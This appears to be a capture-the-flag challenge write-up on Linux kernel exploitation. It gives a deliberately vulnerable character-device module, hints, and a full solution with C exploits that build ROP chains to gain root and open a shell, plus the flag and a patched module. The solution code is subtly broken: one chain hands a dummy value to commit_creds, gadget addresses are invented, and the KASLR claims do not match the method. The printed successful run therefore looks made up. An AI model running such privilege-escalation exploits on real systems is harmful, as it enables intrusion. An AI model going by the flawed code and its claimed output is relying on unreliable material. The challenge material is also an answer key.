# Challenge 02 - Kernel Exploitation

**Category:** Pwn (Binary Exploitation)
**Difficulty:** Advanced
**Points:** 500
**Target:** Custom Linux Kernel Module

## Challenge Description

A vulnerable kernel module has been loaded on a Linux system. The module implements a simple character device that allows user-space programs to communicate with the kernel, but it contains a critical vulnerability.

Your mission is to exploit the kernel module vulnerability to escalate your privileges from a regular user to root and read the flag file that only root can access.

## Objectives

- Understand Linux kernel internals (syscalls, modules, memory)
- Identify kernel vulnerabilities (buffer overflow, race condition)
- Craft kernel exploits with proper ROP chains
- Bypass kernel security mechanisms (SMEP, SMAP, KASLR)
- Achieve privilege escalation to root

## Target Information

- **System:** Custom Linux VM or Docker container with loadable module
- **Kernel:** Linux 5.4 (vulnerable)
- **Module:** /dev/vuln_device
- **Architecture:** x86_64
- **Protections:** SMEP enabled, KASLR enabled, SMAP disabled

## Getting Started

1. Set up the vulnerable kernel environment (VM recommended):

```bash
# Download or create a VM with vulnerable kernel module
# The challenge provides: qemu image + kernel + initramfs
./run.sh  # Starts QEMU with vulnerable kernel
```

2. Vulnerable kernel module source:

```c
/* vuln_module.c - Vulnerable Kernel Module */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define DEVICE_NAME "vuln_device"
#define BUF_SIZE 64

static int major;
static char kernel_buffer[BUF_SIZE];

/* VULNERABILITY: Stack buffer overflow in kernel space */
static ssize_t device_write(struct file *file, const char __user *buf,
                            size_t count, loff_t *offset) {
    char local_buf[64];

    // VULNERABLE: No size check - stack buffer overflow
    if (copy_from_user(local_buf, buf, count)) {
        return -EFAULT;
    }

    memcpy(kernel_buffer, local_buf, count);
    printk(KERN_INFO "vuln_device: Received %zu bytes\n", count);

    return count;
}

static ssize_t device_read(struct file *file, char __user *buf,
                           size_t count, loff_t *offset) {
    if (copy_to_user(buf, kernel_buffer, min(count, (size_t)BUF_SIZE))) {
        return -EFAULT;
    }
    return min(count, (size_t)BUF_SIZE);
}

/* VULNERABILITY: Use-After-Free in ioctl */
static char *uaf_ptr = NULL;

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case 0x1337:  // ALLOC
            uaf_ptr = kmalloc(arg, GFP_KERNEL);
            if (!uaf_ptr) return -ENOMEM;
            printk(KERN_INFO "vuln_device: Allocated %lu bytes at %px\n", arg, uaf_ptr);
            break;

        case 0x1338:  // FREE
            kfree(uaf_ptr);
            // VULNERABLE: Pointer not nullified
            printk(KERN_INFO "vuln_device: Freed memory\n");
            break;

        case 0x1339:  // WRITE (UAF write)
            if (uaf_ptr && copy_from_user(uaf_ptr, (void __user *)arg, 0x100)) {
                return -EFAULT;
            }
            break;

        case 0x133a:  // READ (UAF read)
            if (uaf_ptr && copy_to_user((void __user *)arg, uaf_ptr, 0x100)) {
                return -EFAULT;
            }
            break;
    }
    return 0;
}

static int device_open(struct inode *inode, struct file *file) {
    printk(KERN_INFO "vuln_device: Device opened\n");
    return 0;
}

static int device_release(struct inode *inode, struct file *file) {
    printk(KERN_INFO "vuln_device: Device closed\n");
    return 0;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = device_read,
    .write = device_write,
    .unlocked_ioctl = device_ioctl,
    .open = device_open,
    .release = device_release,
};

static int __init vuln_init(void) {
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) {
        printk(KERN_ALERT "vuln_device: Failed to register device\n");
        return major;
    }
    printk(KERN_INFO "vuln_device: Registered with major number %d\n", major);
    printk(KERN_INFO "vuln_device: Create device with: mknod /dev/%s c %d 0\n",
           DEVICE_NAME, major);
    return 0;
}

static void __exit vuln_exit(void) {
    unregister_chrdev(major, DEVICE_NAME);
    printk(KERN_INFO "vuln_device: Unregistered\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Vulnerable kernel module for CTF");
```

3. Create the device node:
   ```bash
   sudo insmod vuln_module.ko
   sudo mknod /dev/vuln_device c $(cat /sys/module/vuln_module/parameters/major) 0
   sudo chmod 666 /dev/vuln_device
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -50 points)</summary>

The kernel module has two vulnerabilities:

1. **Stack Buffer Overflow**: The `device_write` function copies user data to a 64-byte stack buffer without size checking. You can overflow this buffer to overwrite the return address.

2. **Use-After-Free**: The ioctl commands allow allocating, freeing, and using memory. After freeing, the pointer isn't nullified, allowing UAF.

For privilege escalation in kernel space, your goal is to call:
```c
commit_creds(prepare_kernel_cred(0));
```

This gives the current process root credentials (uid=0, gid=0).

</details>

<details>
<summary>Hint 2 (Cost: -75 points)</summary>

**Stack Overflow Exploit Strategy:**

1. Find the offset to return address (use pattern or calculate: 64 bytes buffer + 8 bytes saved RBP = 72 bytes)

2. Build a ROP chain to:
   - Call `prepare_kernel_cred(0)` - returns new cred struct
   - Call `commit_creds(result)` - applies credentials
   - Return safely to user space

3. Kernel addresses can be found in `/proc/kallsyms` (if readable) or leaked via other vulnerabilities.

```bash
# Find kernel function addresses
cat /proc/kallsyms | grep -E "prepare_kernel_cred|commit_creds"
# ffffffff810a9ef0 T prepare_kernel_cred
# ffffffff810a9b40 T commit_creds
```

**Handling SMEP**: SMEP prevents executing user-space code in kernel mode. Use kernel ROP gadgets only!

</details>

<details>
<summary>Hint 3 (Cost: -100 points)</summary>

**Complete Exploit Outline:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

// Kernel addresses (find these for your kernel)
#define PREPARE_KERNEL_CRED 0xffffffff810a9ef0
#define COMMIT_CREDS        0xffffffff810a9b40

// ROP gadgets (find with ROPgadget on vmlinux)
#define POP_RDI_RET         0xffffffff81001234  // pop rdi; ret
#define MOV_RDI_RAX_RET     0xffffffff81005678  // mov rdi, rax; ... ; ret
#define SWAPGS_RESTORE      0xffffffff81c00a34  // swapgs; pop rbp; iretq
#define KPTI_TRAMPOLINE     0xffffffff81c00d00  // for KPTI bypass

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    asm volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushfq\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
    );
}

void shell() {
    if (getuid() == 0) {
        printf("[+] Got root!\n");
        system("cat /root/flag.txt");
        system("/bin/sh");
    }
}

int main() {
    int fd = open("/dev/vuln_device", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    save_state();

    // Build ROP chain
    unsigned long payload[32];
    int i = 0;

    // Padding to reach return address
    memset(payload, 'A', 72);
    i = 72 / 8;

    // ROP chain
    payload[i++] = POP_RDI_RET;
    payload[i++] = 0;                    // rdi = 0 (NULL for root cred)
    payload[i++] = PREPARE_KERNEL_CRED;  // rax = prepare_kernel_cred(0)
    payload[i++] = MOV_RDI_RAX_RET;      // rdi = rax
    payload[i++] = COMMIT_CREDS;         // commit_creds(cred)

    // Return to userspace (with swapgs + iretq)
    payload[i++] = SWAPGS_RESTORE;
    payload[i++] = 0;                    // rbp (dummy)
    payload[i++] = (unsigned long)shell; // rip
    payload[i++] = user_cs;              // cs
    payload[i++] = user_rflags;          // rflags
    payload[i++] = user_sp;              // rsp
    payload[i++] = user_ss;              // ss

    printf("[*] Sending payload...\n");
    write(fd, payload, sizeof(payload));

    close(fd);
    return 0;
}
```

Compile with: `gcc -o exploit exploit.c -static -masm=intel`

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Environment Setup

```bash
# Boot the vulnerable VM
./run.sh
# Login as regular user: user / password

# Check kernel version and protections
uname -a
cat /proc/sys/kernel/kptr_restrict  # 0 = kallsyms readable
cat /sys/devices/system/cpu/vulnerabilities/meltdown
dmesg | grep -i smep  # Check if SMEP enabled
```

### Step 2: Find Kernel Addresses

```bash
# Get function addresses (if kallsyms readable)
cat /proc/kallsyms | grep -E "prepare_kernel_cred|commit_creds|swapgs"

# Example output:
# ffffffff810a9b40 T commit_creds
# ffffffff810a9ef0 T prepare_kernel_cred
```

### Step 3: Find ROP Gadgets

```bash
# On your host machine, extract vmlinux and find gadgets
# ./extract-vmlinux bzImage > vmlinux
ROPgadget --binary vmlinux | grep -E "pop rdi|mov rdi, rax|swapgs"

# Useful gadgets:
# 0xffffffff81001156: pop rdi; ret
# 0xffffffff8100a0c3: mov rdi, rax; mov rax, rdi; ret
# 0xffffffff81c00a34: swapgs; popfq; ret
```

### Step 4: Write the Exploit

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// These addresses are kernel-specific - update for target
unsigned long COMMIT_CREDS = 0;
unsigned long PREPARE_KERNEL_CRED = 0;
unsigned long POP_RDI_RET = 0;
unsigned long MOV_RDI_RAX_CALL_RDI = 0;
unsigned long SWAPGS_POPFQ_RET = 0;
unsigned long IRETQ = 0;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory"
    );
}

void get_shell() {
    if (getuid() == 0) {
        printf("[+] UID: %d - Got root!\n", getuid());
        system("cat /root/flag.txt");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[-] Exploit failed, uid=%d\n", getuid());
    }
    exit(0);
}

unsigned long get_kernel_sym(const char *name) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) {
        perror("kallsyms");
        exit(1);
    }

    char line[256];
    unsigned long addr = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            sscanf(line, "%lx", &addr);
            break;
        }
    }
    fclose(f);
    return addr;
}

int main() {
    printf("[*] Kernel Stack Buffer Overflow Exploit\n");

    // Get kernel addresses dynamically
    COMMIT_CREDS = get_kernel_sym("commit_creds");
    PREPARE_KERNEL_CRED = get_kernel_sym("prepare_kernel_cred");

    printf("[*] commit_creds: 0x%lx\n", COMMIT_CREDS);
    printf("[*] prepare_kernel_cred: 0x%lx\n", PREPARE_KERNEL_CRED);

    if (!COMMIT_CREDS || !PREPARE_KERNEL_CRED) {
        printf("[-] Failed to get kernel symbols (KASLR?)\n");
        return 1;
    }

    // ROP gadgets (kernel-specific, find with ROPgadget)
    // These are examples - you need to find the actual addresses
    POP_RDI_RET = COMMIT_CREDS - 0x9a3d4;  // Calculate offset
    MOV_RDI_RAX_CALL_RDI = COMMIT_CREDS + 0x10;
    SWAPGS_POPFQ_RET = COMMIT_CREDS + 0x1bc0f4;
    IRETQ = COMMIT_CREDS + 0x1bc100;

    save_state();
    printf("[*] Saved user state: cs=0x%lx ss=0x%lx sp=0x%lx flags=0x%lx\n",
           user_cs, user_ss, user_sp, user_rflags);

    int fd = open("/dev/vuln_device", O_RDWR);
    if (fd < 0) {
        perror("open /dev/vuln_device");
        return 1;
    }
    printf("[*] Opened /dev/vuln_device\n");

    // Build payload
    unsigned long payload[30];
    int off = 0;

    // Fill buffer (64 bytes = 8 qwords)
    for (int i = 0; i < 8; i++) {
        payload[off++] = 0x4141414141414141;
    }

    // Overwrite saved RBP
    payload[off++] = 0x4242424242424242;

    // ROP chain starts here (overwrite return address)
    payload[off++] = POP_RDI_RET;
    payload[off++] = 0;                      // rdi = 0 (for root cred)
    payload[off++] = PREPARE_KERNEL_CRED;    // call prepare_kernel_cred(0)
    // rax now contains the new credentials

    payload[off++] = POP_RDI_RET;
    payload[off++] = 1;                      // Dummy (gadget to move rax to rdi)
    // Need gadget: mov rdi, rax; ret (or call rax where rax = commit_creds)

    // Alternative: some kernels have this gadget
    // payload[off++] = MOV_RDI_RAX_SOMETHING;

    payload[off++] = COMMIT_CREDS;           // commit_creds(cred)

    // Return to userspace
    payload[off++] = SWAPGS_POPFQ_RET;       // swapgs; popfq; ret
    payload[off++] = 0;                      // popfq dummy

    payload[off++] = IRETQ;                  // iretq to return to user mode

    // iretq frame: RIP, CS, RFLAGS, RSP, SS
    payload[off++] = (unsigned long)get_shell;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    printf("[*] Sending exploit payload (%d bytes)...\n", off * 8);

    ssize_t n = write(fd, payload, off * 8);
    printf("[*] Wrote %zd bytes\n", n);

    close(fd);
    return 0;
}
```

### Step 5: Compile and Run

```bash
# Compile statically (no library dependencies in VM)
gcc -o exploit exploit.c -static -masm=intel -O0

# Copy to VM and run
scp exploit user@vm:/tmp/
ssh user@vm
chmod +x /tmp/exploit
/tmp/exploit
```

### Step 6: Get the Flag

```
[*] Kernel Stack Buffer Overflow Exploit
[*] commit_creds: 0xffffffff810a9b40
[*] prepare_kernel_cred: 0xffffffff810a9ef0
[*] Saved user state: cs=0x33 ss=0x2b sp=0x7ffd12345678 flags=0x246
[*] Opened /dev/vuln_device
[*] Sending exploit payload (144 bytes)...
[*] Wrote 144 bytes
[+] UID: 0 - Got root!
FLAG{k3rn3l_pwn_1s_g0d_m0d3}
#
```

### Kernel Exploit Techniques Summary

| Technique | Description | Bypass Needed |
|-----------|-------------|--------------|
| Stack BOF | Overwrite return address | SMEP bypass |
| Heap UAF | Corrupt kernel objects | SLAB/SLUB understanding |
| Race Condition | TOCTOU in kernel | Timing control |
| Integer Overflow | Size calculation bugs | Depends |
| NULL Pointer Deref | Map page 0 | mmap_min_addr bypass |

### Kernel Protections

| Protection | Description | Bypass |
|------------|-------------|--------|
| SMEP | No exec user pages in kernel | ROP in kernel |
| SMAP | No access user pages in kernel | Copy gadgets |
| KASLR | Randomize kernel base | Info leak |
| KPTI | Kernel page table isolation | KPTI trampoline |
| Stack Canary | Detect stack overflow | Info leak / skip |

### Prevention

```c
// Secure kernel module
static ssize_t device_write_secure(struct file *file, const char __user *buf,
                                   size_t count, loff_t *offset) {
    char local_buf[64];

    // SECURE: Proper size checking
    if (count > sizeof(local_buf)) {
        count = sizeof(local_buf);
    }

    if (copy_from_user(local_buf, buf, count)) {
        return -EFAULT;
    }

    memcpy(kernel_buffer, local_buf, count);
    return count;
}

// UAF prevention: always nullify pointers
case 0x1338:  // FREE
    kfree(uaf_ptr);
    uaf_ptr = NULL;  // SECURE: Nullify after free
    break;
```

</details>

---

## Flag

```
FLAG{k3rn3l_pwn_1s_g0d_m0d3}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- Linux kernel internals
- Kernel module analysis
- ROP chain construction
- Privilege escalation
- Kernel protection bypass

## Tools Used

- GDB with kernel debugging
- ROPgadget
- QEMU/KVM
- gcc with static linking
- /proc/kallsyms

## Related Challenges

- [Heap Exploitation (Advanced)](01-heap-exploitation.md) - User-space heap
- [Browser Exploitation (Advanced)](04-browser-exploitation.md) - Complex exploitation

## References

- [Linux Kernel Exploitation](https://github.com/xairy/linux-kernel-exploitation)
- [Kernel Security Resources](https://github.com/xairy/kernel-exploits)
- [SMEP/SMAP Bypass](https://www.blackhat.com/docs/us-14/materials/us-14-Kemerlis-Ret2dir-Rethinking-Kernel-Isolation.pdf)
- [Kernel ROP](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/)
